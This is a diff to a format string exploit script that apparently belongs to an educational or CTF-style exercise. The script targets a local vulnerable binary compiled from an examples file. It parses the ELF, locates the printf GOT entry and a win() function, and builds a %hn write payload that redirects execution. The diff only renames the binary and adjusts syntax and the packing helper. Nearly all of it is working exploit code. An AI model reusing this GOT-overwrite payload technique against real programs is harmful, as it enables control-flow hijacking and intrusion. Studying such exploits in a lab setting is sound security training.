@@ -5,7 +5,7 @@ print("[*] Format String Exploit")
 print("============================================================")
 
 let target = "127.0.0.1:8888"
-let binary = "./format_vuln"
+let binary = "./format_string_vuln"  # Compile from format_string_vuln.c in examples/
 
 print("[+] Target: " + target)
 print("[+] Binary: " + binary)
@@ -25,8 +25,8 @@ print("    [!] Format string offset found: " + str(offset))
 # Step 2: Identify target addresses
 print("\n[*] Step 2: Analyzing binary...")
 let elf = parse_elf(binary)
-let got_entry = elf.got.printf  # Target: GOT entry for printf
-let win_function = elf.symbols.win  # Goal: call win()
+let got_entry = elf["got"]["printf"]  # Target: GOT entry for printf
+let win_function = elf["symbols"]["win"]  # Goal: call win()
 
 print("    printf@GOT: " + hex(got_entry))
 print("    win() @ " + hex(win_function))
@@ -50,7 +50,7 @@ print("    High word: " + hex(value_high) + " -> " + hex(addr_high))
 let padding_low = value_low - 8  # Subtract address lengths
 let padding_high = value_high - value_low
 
-let payload = pack64(addr_low) + pack64(addr_high)
+let payload = p64(addr_low) + p64(addr_high)
 payload = payload + "%" + str(padding_low) + "c"
 payload = payload + "%" + str(offset) + "$hn"
 payload = payload + "%" + str(padding_high) + "c"  
